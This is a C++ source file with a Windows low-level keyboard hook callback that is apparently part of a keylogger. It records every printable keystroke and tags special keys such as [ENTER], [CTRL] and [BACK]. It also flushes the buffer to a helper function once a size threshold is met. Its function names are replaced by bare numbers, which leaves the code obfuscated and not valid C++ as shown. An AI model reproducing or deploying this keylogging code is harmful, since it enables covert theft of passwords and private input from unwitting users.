#include "01.h"
#include "17.h"
#include "18.h"
#include "19.h"
#include "20.h"
LRESULT CALLBACK 17(int a, WPARAM b, LPARAM c) {
    if (a >= 0 && (b == WM_KEYDOWN || b == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)c;
        wchar_t ch = 0;
        BYTE s[256];
        GetKeyboardState(s);
        HKL l = GetKeyboardLayout(0);
        if (ToUnicodeEx(p->vkCode, p->scanCode, s, &ch, 1, 0, l) > 0) {
            if (iswprint(ch) || ch == L'\r' || ch == L'\n' || ch == L'\t') {
                18(ch);
                if (19() >= 20()) {
                    std::wstring d = 21();
                    if (!d.empty()) 22(d);
                }
            }
        }
        if (p->vkCode >= VK_F1 && p->vkCode <= VK_F24) {
            std::wstring sp = L"[F" + std::to_wstring(p->vkCode - VK_F1 + 1) + L"]";
            18(sp);
        }
        if (p->vkCode == VK_BACK) 18(L"[BACK]");
        if (p->vkCode == VK_TAB) 18(L"[TAB]");
        if (p->vkCode == VK_RETURN) 18(L"[ENTER]");
        if (p->vkCode == VK_SHIFT) 18(L"[SHIFT]");
        if (p->vkCode == VK_CONTROL) 18(L"[CTRL]");
        if (p->vkCode == VK_MENU) 18(L"[ALT]");
        if (p->vkCode == VK_CAPITAL) 18(L"[CAPS]");
        if (p->vkCode == VK_ESCAPE) 18(L"[ESC]");
        if (p->vkCode == VK_INSERT) 18(L"[INS]");
        if (p->vkCode == VK_DELETE) 18(L"[DEL]");
        if (p->vkCode == VK_HOME) 18(L"[HOME]");
        if (p->vkCode == VK_END) 18(L"[END]");
        if (p->vkCode == VK_PRIOR) 18(L"[PGUP]");
        if (p->vkCode == VK_NEXT) 18(L"[PGDN]");
        if (p->vkCode == VK_LEFT) 18(L"[LEFT]");
        if (p->vkCode == VK_RIGHT) 18(L"[RIGHT]");
        if (p->vkCode == VK_UP) 18(L"[UP]");
        if (p->vkCode == VK_DOWN) 18(L"[DOWN]");
        if (p->vkCode == VK_LWIN || p->vkCode == VK_RWIN) 18(L"[WIN]");
    }
    return CallNextHookEx(NULL, a, b, c);
}
